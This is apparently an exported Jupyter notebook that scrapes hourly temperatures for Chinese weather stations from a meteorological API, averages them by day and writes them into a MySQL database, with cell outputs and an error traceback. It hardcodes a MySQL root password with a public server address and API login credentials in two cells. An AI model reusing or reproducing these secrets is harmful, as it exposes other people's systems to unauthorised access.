# %%
import pymysql, requests, re, time, json
import numpy as np, pandas as pd

## Mysql Template

import pymysql
db = pymysql.connect(host='119.29.190.115', user='root', password='njuacmicpc',
                         port=3306, db='weather', write_timeout = 6, read_timeout = 6)
cursor = db.cursor()

def sql_insert(db, cursor, table, data):
    keys = ', '.join(data.keys())
    values = ', '.join(['%s'] * len(data))
    sql = 'insert into {table}({keys}) values ({values}) on duplicate key update'.format(table=table, 
            keys=keys, values=values)
    update = ','.join([" {key} = %s".format(key=key) for key in data])
    sql += update
    #print (sql)
    try:
        if cursor.execute(sql, tuple(data.values())*2):
            print('Successful')
            db.commit()
        else:
            print ('Nothing to do')
    except:
        print ('Failed')
        db.rollback()

def get_list(data, i = 0, K = 3):
    n = len(data)
    return ','.join([str(x) for x in data[i * n // K: (i + 1) * n // K]])

url = 'http://api.data.cma.cn:8090/api'
form = {
    'userId': '542355761660o8fuw',
    'pwd': 'bJ4ImKk',
    'dataFormat': 'json',
    'interfaceId': 'getSurfEleByTimeRangeAndStaID',
    'dataCode': 'SURF_CHN_MUL_HOR',
    'timeRange': '[{}0000,{}0000]'.format(time.strftime('%Y%m%d24', time.localtime(time.time() - 6 * 24 * 60 * 60)),
                 time.strftime('%Y%m%d24', time.localtime(time.time() - 1 * 24 * 60 * 60))),
    'staIDs': '',
    'elements': 'TEM,Station_Id_C,Year,Mon,Day,Hour',
}

# %%
id_list = [54511,53691,53693,54534,53772,50431,50434,53463,54342,54662,50136,50953,58367,58027,58044,58238,58245,58259,58349,58354,58450,58457,58659,58116,58321,58334,58437,58847,59134,57993,58502,58606,54765,54823,54857,53982,57083,57178,57297,57278,57447,57461,57494,57687,57872,57972,59082,59287,59488,59493,59658,59659,57957,59046,59431,59644,59758,59951,57513,57516,56187,56492,56666,57816,56778,56966,56969,57016,57127,57242,57245,54527]
id_list = [str(x) for x in id_list]
K = 3

station_df = pd.read_excel('./China_SURF_Station.xlsx')
station_dict = {}
for id, name, prov in zip(station_df.区站号, station_df.站名, station_df.省份):
    station_dict[str(id)] = (name, prov)

# %%
texts = []
for i in range(K):
    form['staIDs'] = get_list(id_list, i)
    response = requests.get(url = url, params = form)
    texts.append(response.text)
    
result = [json.loads(x) for x in texts]
for i in range(K):
    result[i] = result[i]['DS']

# %%
for i in range(K):
    for j in range(len(result[i])):
        name, prov = station_dict[result[i][j]['Station_Id_C']]
        result[i][j]['name'] = name
        result[i][j]['prov'] = prov
    result[i] = [ x for x in result[i] if x['Hour'] in ['2','8','14','20']]
    results = []
for i in range(K):
    results += result[i]

# %%
from collections import defaultdict
dic_by_id = defaultdict(lambda: list())
for x in results:
    dic_by_id[x['Station_Id_C']].append(x)

# %%
dic_by_name_agg = {}
for id in id_list:
    name = station_dict[id][0]
    cur = dic_by_id[id]
    aggregate_weather = []
    n = len(cur)
    i = 0; j = 0;
    while (cur[i]['Hour'] != '2'): i += 1
    while (i + 3 < n):
        avg = 0.25 * (float(cur[i]['TEM']) + float(cur[i+1]['TEM']) + float(cur[i+2]['TEM']) + float(cur[i+3]['TEM']))
        if(cur[i]['Day']!=cur[i+3]['Day']):
            print(name, id)
            print(cur[i]['Day'],cur[i+1]['Day'],cur[i+2]['Day'],cur[i+3]['Day'])
            print(cur[i]['Hour'],cur[i+1]['Hour'],cur[i+2]['Hour'],cur[i+3]['Hour'])
            while (cur[i]['Day']==cur[i+1]['Day']): i += 1
            continue
        else:
            aggregate_weather.append({'prov':cur[i]['prov'],'year':cur[i]['Year'],'month':cur[i]['Mon'],
                                  'day':cur[i]['Day'],'TEM_Avg':avg})
        i += 4
    dic_by_name_agg[name] = aggregate_weather

# %%
for key, dic_list in dic_by_name_agg.items():
    for dic in dic_list:
        cur = {}
        cur['name'] = key
        cur.update(dic)
        print (cur)
        sql_insert(db, cursor, 'TEM', cur)
# Out:
# {'name': '北京', 'prov': '北京', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 9.075000000000001}
# Nothing to do
# {'name': '北京', 'prov': '北京', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 7.6}
# Failed
# ---------------------------------------------------------------------------
# InternalError                             Traceback (most recent call last)
# <ipython-input-9-dc8fa7fbeaec> in sql_insert(db, cursor, table, data)
#      19     try:
# ---> 20         if cursor.execute(sql, tuple(data.values())*2):
#      21             print('Successful')
#
# ~/anaconda3/lib/python3.7/site-packages/pymysql/cursors.py in execute(self, query, args)
#     169
# --> 170         result = self._query(query)
#     171         self._executed = query
#
# ~/anaconda3/lib/python3.7/site-packages/pymysql/cursors.py in _query(self, q)
#     327         self._clear_result()
# --> 328         conn.query(q)
#     329         self._do_get_result()
#
# ~/anaconda3/lib/python3.7/site-packages/pymysql/connections.py in query(self, sql, unbuffered)
#     515         self._execute_command(COMMAND.COM_QUERY, sql)
# --> 516         self._affected_rows = self._read_query_result(unbuffered=unbuffered)
#     517         return self._affected_rows
#
# ~/anaconda3/lib/python3.7/site-packages/pymysql/connections.py in _read_query_result(self, unbuffered)
#     726             result = MySQLResult(self)
# --> 727             result.read()
#     728         self._result = result
#
# ~/anaconda3/lib/python3.7/site-packages/pymysql/connections.py in read(self)
#    1065         try:
# -> 1066             first_packet = self.connection._read_packet()
#    1067
#
# ~/anaconda3/lib/python3.7/site-packages/pymysql/connections.py in _read_packet(self, packet_type)
#     682         packet = packet_type(buff, self.encoding)
# --> 683         packet.check_error()
#     684         return packet
#
# ~/anaconda3/lib/python3.7/site-packages/pymysql/protocol.py in check_error(self)
#     219             if DEBUG: print("errno =", errno)
# --> 220             err.raise_mysql_exception(self._data)
#     221
#
# ~/anaconda3/lib/python3.7/site-packages/pymysql/err.py in raise_mysql_exception(data)
#     108     errorclass = error_map.get(errno, InternalError)
# --> 109     raise errorclass(errno, errval)
#
# InternalError: (1364, "Field 'date' doesn't have a default value")
#
# During handling of the above exception, another exception occurred:
#
# InternalError                             Traceback (most recent call last)
# <ipython-input-24-25876f668491> in <module>()
#       5         cur.update(dic)
#       6         print (cur)
# ----> 7         sql_insert(db, cursor, 'TEM', cur)
#
# <ipython-input-9-dc8fa7fbeaec> in sql_insert(db, cursor, table, data)
#      25     except:
#      26         print ('Failed')
# ---> 27         db.rollback()
#      28
#      29 def get_list(data, i = 0, K = 3):
#
# ~/anaconda3/lib/python3.7/site-packages/pymysql/connections.py in rollback(self)
#     430         """
#     431         self._execute_command(COMMAND.COM_QUERY, "ROLLBACK")
# --> 432         self._read_ok_packet()
#     433
#     434     def show_warnings(self):
#
# ~/anaconda3/lib/python3.7/site-packages/pymysql/connections.py in _read_ok_packet(self)
#     394
#     395     def _read_ok_packet(self):
# --> 396         pkt = self._read_packet()
#     397         if not pkt.is_ok_packet():
#     398             raise err.OperationalError(2014, "Command Out of Sync")
#
# ~/anaconda3/lib/python3.7/site-packages/pymysql/connections.py in _read_packet(self, packet_type)
#     681
#     682         packet = packet_type(buff, self.encoding)
# --> 683         packet.check_error()
#     684         return packet
#     685
#
# ~/anaconda3/lib/python3.7/site-packages/pymysql/protocol.py in check_error(self)
#     218             errno = self.read_uint16()
#     219             if DEBUG: print("errno =", errno)
# --> 220             err.raise_mysql_exception(self._data)
#     221
#     222     def dump(self):
#
# ~/anaconda3/lib/python3.7/site-packages/pymysql/err.py in raise_mysql_exception(data)
#     107         errval = data[3:].decode('utf-8', 'replace')
#     108     errorclass = error_map.get(errno, InternalError)
# --> 109     raise errorclass(errno, errval)
#
# InternalError: (1364, "Field 'date' doesn't have a default value")

# %%
with open("./id_list", "w") as fp:
    for id in id_list:
        fp.write('{}\n'.format(id))

# %%
with open("./id_list", "r") as fp:
    for x in fp:
        print (x[:-1])
# Out:
# 54511
# 54527
# 53691
# 53693
# 53772
# 50431
# 53463
# 54342
# 54662
# 54161
# 50136
# 50953
# 58367
# 58027
# 58238
# 58245
# 58349
# 58457
# 58659
# 58321
# 58334
# 58847
# 59134
# 57993
# 58606
# 54823
# 54857
# 53982
# 57083
# 57297
# 57278
# 57447
# 57461
# 57494
# 59287
# 59493
# 59658
# 57687
# 57972
# 57957
# 59046
# 59431
# 59758
# 56187
# 57204
# 57516
# 56778
# 56969
# 57816
# 57127

# %% [markdown]
# ## Main Method

# %%
import pymysql, requests, re, time, json
import numpy as np, pandas as pd

## Mysql Template

import pymysql
db = pymysql.connect(host='119.29.190.115', user='root', password='njuacmicpc',
                         port=3306, db='weather', write_timeout = 10, read_timeout = 6)
cursor = db.cursor()

def sql_insert(db, cursor, table, data):
    keys = ', '.join(data.keys())
    values = ', '.join(['%s'] * len(data))
    sql = 'insert into {table}({keys}) values ({values}) on duplicate key update'.format(table=table, 
            keys=keys, values=values)
    update = ','.join([" {key} = %s".format(key=key) for key in data])
    sql += update
    #print (sql)
    try:
        if cursor.execute(sql, tuple(data.values())*2):
            print('Successful')
            db.commit()
        else:
            print ('Nothing to do')
    except:
        print ('Failed on {}'.format(data))
        db.rollback()

def get_list(data, i = 0, K = 3):
    n = len(data)
    return ','.join([str(x) for x in data[i * n // K: (i + 1) * n // K]])

url = 'http://api.data.cma.cn:8090/api'
form = {
    'userId': '542355761660o8fuw',
    'pwd': 'bJ4ImKk',
    'dataFormat': 'json',
    'interfaceId': 'getSurfEleByTimeRangeAndStaID',
    'dataCode': 'SURF_CHN_MUL_HOR',
    'timeRange': '[{}0000,{}0000]'.format(time.strftime('%Y%m%d23', time.localtime(time.time() - 6 * 24 * 60 * 60)),
                 time.strftime('%Y%m%d23', time.localtime(time.time() - 1 * 24 * 60 * 60))),
    'staIDs': '',
    'elements': 'TEM,Station_Id_C,Year,Mon,Day,Hour',
}

K = 3
def read_id_list():
    id_list = []
    with open("./Weather_Scrawling/id_list", "r") as fp:
        for x in fp:
            id_list.append(str(x[:-1]))
    return id_list

def run():
    id_list = read_id_list()
    print (id_list)
    station_df = pd.read_excel('./China_SURF_Station.xlsx')
    station_dict = {}
    for id, name, prov in zip(station_df.区站号, station_df.站名, station_df.省份):
        station_dict[str(id)] = (name, prov)
    
    texts = []
    for i in range(K):
        form['staIDs'] = get_list(id_list, i)
        response = requests.get(url = url, params = form)
        texts.append(response.text)
        
    result = [json.loads(x) for x in texts]
    print (result)
    for i in range(K):
        result[i] = result[i]['DS']
    
    for i in range(K):
        for j in range(len(result[i])):
            name, prov = station_dict[result[i][j]['Station_Id_C']]
            result[i][j]['name'] = name
            result[i][j]['prov'] = prov
        result[i] = [ x for x in result[i] if x['Hour'] in ['2','8','14','20']]
        results = []
    for i in range(K):
        results += result[i]
    
    from collections import defaultdict
    dic_by_id = defaultdict(lambda: list())
    for x in results:
        dic_by_id[x['Station_Id_C']].append(x)
    
    dic_by_name_agg = {}
    for id in id_list:
        name = station_dict[id][0]
        cur = dic_by_id[id]
        aggregate_weather = []
        n = len(cur)
        i = 0; j = 0;
        while (cur[i]['Hour'] != '2'): i += 1
        while (i + 3 < n):
            avg = 0.25 * (float(cur[i]['TEM']) + float(cur[i+1]['TEM']) + float(cur[i+2]['TEM']) + float(cur[i+3]['TEM']))
            if(cur[i]['Day']!=cur[i+3]['Day']):
                print(name, id)
                print(cur[i]['Day'],cur[i+1]['Day'],cur[i+2]['Day'],cur[i+3]['Day'])
                print(cur[i]['Hour'],cur[i+1]['Hour'],cur[i+2]['Hour'],cur[i+3]['Hour'])
                while (cur[i]['Day']==cur[i+1]['Day']): i += 1
                continue
            else:
                date = '{x[0]}-{x[1]:0>2}-{x[2]:0>2}'.format(x = (cur[i]['Year'],cur[i]['Mon'],cur[i]['Day']) )
                aggregate_weather.append({'prov':cur[i]['prov'],'year':cur[i]['Year'],'month':cur[i]['Mon'],
                                      'day':cur[i]['Day'],'TEM_Avg':avg,'date':date})
            i += 4
        dic_by_name_agg[name] = aggregate_weather
        
    for key, dic_list in dic_by_name_agg.items():
        for dic in dic_list:
            cur = {}
            cur['name'] = key
            cur.update(dic)
            print (cur)
            sql_insert(db, cursor, 'TEM', cur)
    db.close()
    
if __name__ == '__main__':
    run()
# Out:
# ['54511', '53691', '53693', '54534', '53772', '50431', '50434', '53463', '54342', '54662', '50136', '50953', '58367', '58027', '58044', '58238', '58245', '58259', '58349', '58354', '58450', '58457', '58659', '58116', '58321', '58334', '58437', '58847', '59134', '57993', '58502', '58606', '54765', '54823', '54857', '53982', '57083', '57178', '57297', '57278', '57447', '57461', '57494', '57687', '57872', '57972', '59082', '59287', '59488', '59493', '59658', '59659', '57957', '59046', '59431', '59644', '59758', '59951', '57513', '57516', '56187', '56492', '56666', '57816', '56778', '56966', '56969', '57016', '57127', '57242', '57245', '54527']
# [{'returnCode': '0', 'returnMessage': 'Query Succeed', 'rowCount': '2904', 'colCount': '6', 'requestParams': 'datacode=SURF_CHN_MUL_HOR&staids=54511,53691,53693,54534,53772,50431,50434,53463,54342,54662,50136,50953,58367,58027,58044,58238,58245,58259,58349,58354,58450,58457,58659,58116&timerange=[20181110230000,20181115230000]&elements=TEM,Station_Id_C,Year,Mon,Day,Hour', 'requestTime': '2018-11-16 08:21:09', 'responseTime': '2018-11-16 08:21:09', 'takeTime': '0.058', 'fieldNames': '温度/气温 区站号(字符) 年 月 日 时', 'fieldUnits': '摄氏度(℃) - 年 月 日 时', 'DS': [{'TEM': '-20.9000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '10', 'Hour': '23'}, {'TEM': '-20.1000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '0'}, {'TEM': '-16.2000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '1'}, {'TEM': '-13.7000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '2'}, {'TEM': '-10.6000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '3'}, {'TEM': '-8.9000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '4'}, {'TEM': '-6.1000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '5'}, {'TEM': '-3.6000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '6'}, {'TEM': '-2.6000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '7'}, {'TEM': '-5.9000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '8'}, {'TEM': '-9.7000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '9'}, {'TEM': '-11.6000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '10'}, {'TEM': '-13.0000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '11'}, {'TEM': '-14.9000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '12'}, {'TEM': '-14.9000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '13'}, {'TEM': '-16.2000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '14'}, {'TEM': '-17.3000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '15'}, {'TEM': '-17.7000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '16'}, {'TEM': '-18.3000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '17'}, {'TEM': '-18.8000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '18'}, {'TEM': '-19.3000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '19'}, {'TEM': '-19.9000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '20'}, {'TEM': '-20.3000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '21'}, {'TEM': '-20.6000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '22'}, {'TEM': '-21.0000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '11', 'Hour': '23'}, {'TEM': '-20.4000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '12', 'Hour': '0'}, {'TEM': '-17.7000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '12', 'Hour': '1'}, {'TEM': '-14.8000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '12', 'Hour': '2'}, {'TEM': '-11.1000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '12', 'Hour': '3'}, {'TEM': '-8.3000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '12', 'Hour': '4'}, {'TEM': '-6.8000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '12', 'Hour': '5'}, {'TEM': '-4.8000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '12', 'Hour': '6'}, {'TEM': '-3.1000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '12', 'Hour': '7'}, {'TEM': '-7.3000', 'Station_Id_C': '50136', 'Year': '2018', 'Mon': '11', 'Day': '12', 'Hour': '8'}, {'TEM': ' ...
# {'name': '北京', 'prov': '北京', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 9.075000000000001, 'date': '2018-11-11'}
# Nothing to do
# {'name': '北京', 'prov': '北京', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 7.6, 'date': '2018-11-12'}
# Nothing to do
# {'name': '北京', 'prov': '北京', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 7.15, 'date': '2018-11-13'}
# Nothing to do
# {'name': '北京', 'prov': '北京', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 6.6000000000000005, 'date': '2018-11-14'}
# Successful
# {'name': '北京', 'prov': '北京', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 6.975, 'date': '2018-11-15'}
# Successful
# {'name': '正定', 'prov': '河北', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 9.5, 'date': '2018-11-11'}
# Nothing to do
# {'name': '正定', 'prov': '河北', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 9.775, 'date': '2018-11-12'}
# Nothing to do
# {'name': '正定', 'prov': '河北', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 8.9, 'date': '2018-11-13'}
# Nothing to do
# {'name': '正定', 'prov': '河北', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 10.225000000000001, 'date': '2018-11-14'}
# Successful
# {'name': '正定', 'prov': '河北', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 8.7, 'date': '2018-11-15'}
# Successful
# {'name': '井陉', 'prov': '河北', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 7.85, 'date': '2018-11-11'}
# Nothing to do
# {'name': '井陉', 'prov': '河北', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 8.65, 'date': '2018-11-12'}
# Nothing to do
# {'name': '井陉', 'prov': '河北', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 8.5, 'date': '2018-11-13'}
# Nothing to do
# {'name': '井陉', 'prov': '河北', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 8.924999999999999, 'date': '2018-11-14'}
# Successful
# {'name': '井陉', 'prov': '河北', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 7.750000000000001, 'date': '2018-11-15'}
# Successful
# {'name': '唐山', 'prov': '河北', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 7.125, 'date': '2018-11-11'}
# Successful
# {'name': '唐山', 'prov': '河北', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 7.199999999999999, 'date': '2018-11-12'}
# Successful
# {'name': '唐山', 'prov': '河北', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 6.7250000000000005, 'date': '2018-11-13'}
# Successful
# {'name': '唐山', 'prov': '河北', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 7.0249999999999995, 'date': '2018-11-14'}
# Successful
# {'name': '唐山', 'prov': '河北', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 3.425, 'date': '2018-11-15'}
# Successful
# {'name': '太原', 'prov': '山西', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 4.95, 'date': '2018-11-11'}
# Nothing to do
# {'name': '太原', 'prov': '山西', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 4.525, 'date': '2018-11-12'}
# Nothing to do
# {'name': '太原', 'prov': '山西', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 7.35, 'date': '2018-11-13'}
# Nothing to do
# {'name': '太原', 'prov': '山西', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 7.475, 'date': '2018-11-14'}
# Successful
# {'name': '太原', 'prov': '山西', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 6.1, 'date': '2018-11-15'}
# Successful
# {'name': '根河市', 'prov': '内蒙古', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': -12.6, 'date': '2018-11-11'}
# Nothing to do
# {'name': '根河市', 'prov': '内蒙古', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': -11.1, 'date': '2018-11-12'}
# Nothing to do
# {'name': '根河市', 'prov': '内蒙古', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': -9.325, 'date': '2018-11-13'}
# Nothing to do
# {'name': '根河市', 'prov': '内蒙古', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': -8.425, 'date': '2018-11-14'}
# Successful
# {'name': '根河市', 'prov': '内蒙古', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': -18.2, 'date': '2018-11-15'}
# Successful
# {'name': '图里河', 'prov': '内蒙古', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': -13.075, 'date': '2018-11-11'}
# Successful
# {'name': '图里河', 'prov': '内蒙古', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': -11.274999999999999, 'date': '2018-11-12'}
# Successful
# {'name': '图里河', 'prov': '内蒙古', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': -7.475, 'date': '2018-11-13'}
# Successful
# {'name': '图里河', 'prov': '内蒙古', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': -7.375, 'date': '2018-11-14'}
# Successful
# {'name': '图里河', 'prov': '内蒙古', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': -18.05, 'date': '2018-11-15'}
# Successful
# {'name': '呼和浩特', 'prov': '内蒙古', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 0.050000000000000044, 'date': '2018-11-11'}
# Nothing to do
# {'name': '呼和浩特', 'prov': '内蒙古', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 1.675, 'date': '2018-11-12'}
# Nothing to do
# {'name': '呼和浩特', 'prov': '内蒙古', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 5.45, 'date': '2018-11-13'}
# Nothing to do
# {'name': '呼和浩特', 'prov': '内蒙古', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': -0.07500000000000018, 'date': '2018-11-14'}
# Successful
# {'name': '呼和浩特', 'prov': '内蒙古', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': -4.575, 'date': '2018-11-15'}
# Successful
# {'name': '沈阳', 'prov': '辽宁', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 2.525, 'date': '2018-11-11'}
# Nothing to do
# {'name': '沈阳', 'prov': '辽宁', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 3.35, 'date': '2018-11-12'}
# Nothing to do
# {'name': '沈阳', 'prov': '辽宁', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 2.925, 'date': '2018-11-13'}
# Nothing to do
# {'name': '沈阳', 'prov': '辽宁', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 6.574999999999999, 'date': '2018-11-14'}
# Successful
# {'name': '沈阳', 'prov': '辽宁', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 0.20000000000000018, 'date': '2018-11-15'}
# Successful
# {'name': '大连', 'prov': '辽宁', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 8.275, 'date': '2018-11-11'}
# Nothing to do
# {'name': '大连', 'prov': '辽宁', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 10.575000000000001, 'date': '2018-11-12'}
# Nothing to do
# {'name': '大连', 'prov': '辽宁', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 9.350000000000001, 'date': '2018-11-13'}
# Nothing to do
# {'name': '大连', 'prov': '辽宁', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 11.45, 'date': '2018-11-14'}
# Successful
# {'name': '大连', 'prov': '辽宁', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 6.4750000000000005, 'date': '2018-11-15'}
# Successful
# {'name': '漠河', 'prov': '黑龙江', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': -13.924999999999999, 'date': '2018-11-11'}
# Nothing to do
# {'name': '漠河', 'prov': '黑龙江', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': -14.200000000000001, 'date': '2018-11-12'}
# Nothing to do
# {'name': '漠河', 'prov': '黑龙江', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': -10.65, 'date': '2018-11-13'}
# Nothing to do
# {'name': '漠河', 'prov': '黑龙江', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': -11.675, 'date': '2018-11-14'}
# Successful
# {'name': '漠河', 'prov': '黑龙江', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': -19.225, 'date': '2018-11-15'}
# Successful
# {'name': '哈尔滨', 'prov': '黑龙江', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': -1.6500000000000001, 'date': '2018-11-11'}
# Nothing to do
# {'name': '哈尔滨', 'prov': '黑龙江', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': -2.575, 'date': '2018-11-12'}
# Nothing to do
# {'name': '哈尔滨', 'prov': '黑龙江', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': -2.125, 'date': '2018-11-13'}
# Nothing to do
# {'name': '哈尔滨', 'prov': '黑龙江', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 0.9500000000000001, 'date': '2018-11-14'}
# Successful
# {'name': '哈尔滨', 'prov': '黑龙江', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': -4.699999999999999, 'date': '2018-11-15'}
# Successful
# {'name': '徐家汇', 'prov': '上海', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 16.975, 'date': '2018-11-11'}
# Nothing to do
# {'name': '徐家汇', 'prov': '上海', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 15.05, 'date': '2018-11-12'}
# Nothing to do
# {'name': '徐家汇', 'prov': '上海', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 14.875, 'date': '2018-11-13'}
# Nothing to do
# {'name': '徐家汇', 'prov': '上海', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 15.95, 'date': '2018-11-14'}
# Successful
# {'name': '徐家汇', 'prov': '上海', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 15.7, 'date': '2018-11-15'}
# Successful
# {'name': '徐州', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 11.575000000000001, 'date': '2018-11-11'}
# Nothing to do
# {'name': '徐州', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 9.175, 'date': '2018-11-12'}
# Nothing to do
# {'name': '徐州', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 11.9, 'date': '2018-11-13'}
# Nothing to do
# {'name': '徐州', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 13.2, 'date': '2018-11-14'}
# Successful
# {'name': '徐州', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 12.674999999999999, 'date': '2018-11-15'}
# Successful
# {'name': '连云港', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 11.575, 'date': '2018-11-11'}
# Successful
# {'name': '连云港', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 11.325, 'date': '2018-11-12'}
# Successful
# {'name': '连云港', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 10.725000000000001, 'date': '2018-11-13'}
# Successful
# {'name': '连云港', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 12.725, 'date': '2018-11-14'}
# Successful
# {'name': '连云港', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 13.725000000000001, 'date': '2018-11-15'}
# Successful
# {'name': '南京', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 13.35, 'date': '2018-11-11'}
# Nothing to do
# {'name': '南京', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 13.475000000000001, 'date': '2018-11-12'}
# Nothing to do
